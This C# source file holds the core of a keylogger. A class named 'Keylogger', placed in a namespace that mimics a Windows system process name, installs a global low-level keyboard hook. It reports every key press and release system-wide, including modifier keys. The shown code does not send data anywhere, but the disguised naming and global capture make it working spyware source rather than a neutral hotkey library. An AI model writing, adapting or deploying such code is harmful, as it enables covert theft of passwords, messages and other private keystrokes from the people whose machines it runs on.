using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Windows_Local_Host_Process
{
	internal static class Pinvokes
	{
		public delegate IntPtr WindowHookHandler(int nCode, IntPtr wParam, IntPtr lParam);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr SetWindowsHookEx(int idHook, WindowHookHandler lpfn, IntPtr hMod, uint dwThreadId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("user32.dll")]
		public static extern short GetKeyState(int vKey);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	}

	internal static class Keylogger
	{
		private static IntPtr keyboardHook = IntPtr.Zero;
		private static readonly Pinvokes.WindowHookHandler keyboardHookHandler = KeyboardHookCallbackFunction;

		[StructLayout(LayoutKind.Sequential)]
		private struct KeyboardLLHookStruct
		{
			public uint vkCode;
			public uint scanCode;
			public KBDLLHOOKSTRUCTFlags flags;
			public uint time;
			public UIntPtr dwExtraInfo;
		}
		[Flags]
		private enum KBDLLHOOKSTRUCTFlags : uint
		{
			LLKHF_EXTENDED = 0x01,
			LLKHF_INJECTED = 0x10,
			LLKHF_ALTDOWN = 0x20,
			LLKHF_UP = 0x80,
		}
		[Flags]
		public enum KeyboardEventState
		{
			WM_KEYDOWN = 256,
			WM_KEYUP = 257,
			WM_SYSKEYDOWN = 260,
			WM_SYSKEYUP = 261
		}
		public struct KeyboardEventData
		{
			public List<VirtualKeys> ModifierKeys;
			public VirtualKeys MainKey;
			public KeyboardEventState EventType;
		}

		public static event EventHandler<KeyboardEventData> KeyPressed;
		public static event EventHandler<KeyboardEventData> KeyReleased;

		public static void StartWatching()
		{
			if (keyboardHook == IntPtr.Zero)
				keyboardHook = SetHook(13, keyboardHookHandler);
		}

		public static bool StopWatching()
		{
			bool success = Pinvokes.UnhookWindowsHookEx(keyboardHook);
			keyboardHook = IntPtr.Zero;

			return success;
		}

		private static IntPtr SetHook(int hookId, Pinvokes.WindowHookHandler callbackFunc)
		{
			using (Process curProcess = Process.GetCurrentProcess())
			{
				using (ProcessModule curModule = curProcess.MainModule)
				{
					return Pinvokes.SetWindowsHookEx(hookId, callbackFunc, Pinvokes.GetModuleHandle(curModule.ModuleName), 0);
				}
			}
		}

		private static IntPtr KeyboardHookCallbackFunction(int nCode, IntPtr wParam, IntPtr lParam)
		{
			KeyboardLLHookStruct lowLevelEventData = (KeyboardLLHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardLLHookStruct));

			KeyboardEventData eventData = new KeyboardEventData
			{
				MainKey = VirtualKeys.None,
				ModifierKeys = new List<VirtualKeys>()
			};

			if (Pinvokes.GetKeyState((int)VirtualKeys.LShiftKey) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.LShiftKey)
			{
				eventData.ModifierKeys.Add(VirtualKeys.LShiftKey);
			}
			if (Pinvokes.GetKeyState((int)VirtualKeys.RShiftKey) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.RShiftKey)
			{
				eventData.ModifierKeys.Add(VirtualKeys.RShiftKey);
			}

			if (Pinvokes.GetKeyState((int)VirtualKeys.LControlKey) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.LControlKey)
				eventData.ModifierKeys.Add(VirtualKeys.LControlKey);
			if (Pinvokes.GetKeyState((int)VirtualKeys.RControlKey) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.RControlKey)
				eventData.ModifierKeys.Add(VirtualKeys.RControlKey);
			if (Pinvokes.GetKeyState((int)VirtualKeys.LMenu) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.LMenu)
				eventData.ModifierKeys.Add(VirtualKeys.LMenu);
			if (Pinvokes.GetKeyState((int)VirtualKeys.RMenu) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.RMenu)
				eventData.ModifierKeys.Add(VirtualKeys.RMenu);
			if (Pinvokes.GetKeyState((int)VirtualKeys.LWin) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.LWin)
				eventData.ModifierKeys.Add(VirtualKeys.LWin);
			if (Pinvokes.GetKeyState((int)VirtualKeys.RWin) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.RWin)
				eventData.ModifierKeys.Add(VirtualKeys.RWin);

			eventData.MainKey = (VirtualKeys)lowLevelEventData.vkCode;

			eventData.EventType = (KeyboardEventState)wParam;

			if (KeyPressed != null && (eventData.EventType == KeyboardEventState.WM_KEYDOWN || eventData.EventType == KeyboardEventState.WM_SYSKEYDOWN))
				KeyPressed(null, eventData);
			if (KeyReleased != null && (eventData.EventType == KeyboardEventState.WM_KEYUP || eventData.EventType == KeyboardEventState.WM_SYSKEYUP))
				KeyReleased(null, eventData);

			return Pinvokes.CallNextHookEx(keyboardHook, nCode, wParam, lParam);
		}
	}
}
